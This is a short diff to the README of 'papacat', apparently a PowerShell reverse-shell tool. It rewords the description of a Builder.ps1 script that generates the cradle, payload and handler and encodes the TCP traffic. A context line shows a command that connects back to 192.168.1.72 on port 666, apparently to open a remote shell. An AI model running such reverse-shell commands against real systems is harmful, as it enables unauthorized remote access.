@@ -102,7 +102,7 @@ papacat -c 192.168.1.72 -ep -p 666 -v
 
 # papacat Automation - Obfuscation
 
-[Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1) cmdlet automates the creation of papacat reverse tcp shell ( payload - handler )<br />
+[Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1) cmdlet automates the creation of papacat reverse tcp shell<br />( crandle + payload + handler ) and encode\decode tcp data flow if invoked with -force 'true' parameter.<br />
 GitHub: [https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1)
 
 <br />
